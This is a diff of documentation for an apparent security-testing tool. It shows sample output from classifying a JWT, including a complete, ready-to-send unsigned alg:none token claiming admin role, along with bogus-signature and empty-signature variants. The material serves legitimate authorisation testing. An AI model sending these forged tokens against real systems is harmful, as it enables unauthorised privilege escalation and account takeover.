@@ -35,9 +35,9 @@ origin: AI Threat Hunting
       ```bash
       aith assess classify-payload "$TOKEN" --mutations
       #   type: jwt
-      #   escalation: 'eyJhbGciOiJub25l..."role":"admin","sub":"1"}.'   ← ready-to-send alg:none token
-      #               '<header>.<payload>.AAAA'                          ← bogus signature
-      #   boundary:   '' 'a' (255×a)                                     ← empty / junk-signature variants
+      #   escalation: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0.'  ← ready-to-send alg:none token (header={"alg":"none","typ":"JWT"}, payload={"role":"admin","sub":"1"})
+      #               '<header>.<payload>.AAAA'   ← original header.payload with a bogus signature
+      #   boundary:   '' 'a' (255×a)              ← empty / junk-signature variants
       #   empty:      '' 'null' 'undefined' ' ' '\x00'
       ```
       These are starting probes; for full claim editing, secret cracking, and key confusion use
